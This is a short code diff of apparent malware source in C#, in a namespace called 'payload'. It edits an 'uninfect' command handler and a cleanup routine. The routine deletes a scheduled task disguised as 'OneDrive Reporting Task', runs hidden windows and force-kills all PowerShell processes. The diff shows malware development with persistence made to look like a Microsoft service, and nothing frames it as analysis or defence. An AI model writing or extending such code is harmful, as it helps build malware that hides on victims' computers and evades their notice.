@@ -198,7 +198,7 @@ namespace payload
                     }
                 case "uninfect":
                     {
-                        if (args[0] != Environment.MachineName || !args[0].ToLower().Contains("all")) break;
+                        if (args[0] != Environment.MachineName || args[0].ToLower() != "all") break;
                         Uninfect();
                         break;
                     }
@@ -239,10 +239,17 @@ namespace payload
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
-                Arguments = "/delete /tn \"OneDrive\" /f",
+                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
+                UseShellExecute = true,
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
-            foreach (Process p in Process.GetProcessesByName("powershell")) p.Kill();
+            Process.Start(new ProcessStartInfo()
+            {
+                FileName = "taskkill.exe",
+                Arguments = "/f /im powershell.exe",
+                UseShellExecute = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
             Environment.Exit(1);
         }
     }
